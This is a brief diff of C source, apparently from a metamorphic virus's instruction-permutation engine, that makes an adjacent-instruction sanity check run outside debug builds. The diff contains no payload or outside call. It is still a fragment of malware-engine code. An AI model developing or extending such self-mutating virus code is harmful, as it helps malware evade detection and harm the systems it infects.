@@ -5,11 +5,7 @@
 #include "compiler_utils.h"
 #include "disasm.h"
 #include "utils.h"
-
-#ifdef DEBUG
-# include "errors.h"
-# include "syscall.h"
-#endif
+#include "errors.h"
 
 static bool	want_to_permutate(uint64_t *seed)
 {
@@ -36,14 +32,11 @@ static void	permutate_neighbors(struct operands *a, struct operands *b)
 		permutate_neighbors(b, a);
 		return;
 	}
-
-#ifdef DEBUG
 	// check if actually neighbours!
 	if (a->addr + a->length != b->addr)
 	{
 		sys_exit(errors(ERR_VIRUS, _ERR_IMPOSSIBLE));
 	}
-#endif
 
 	// backup 1st
 	uint8_t	swap_code[INSTRUCTION_MAXLEN];
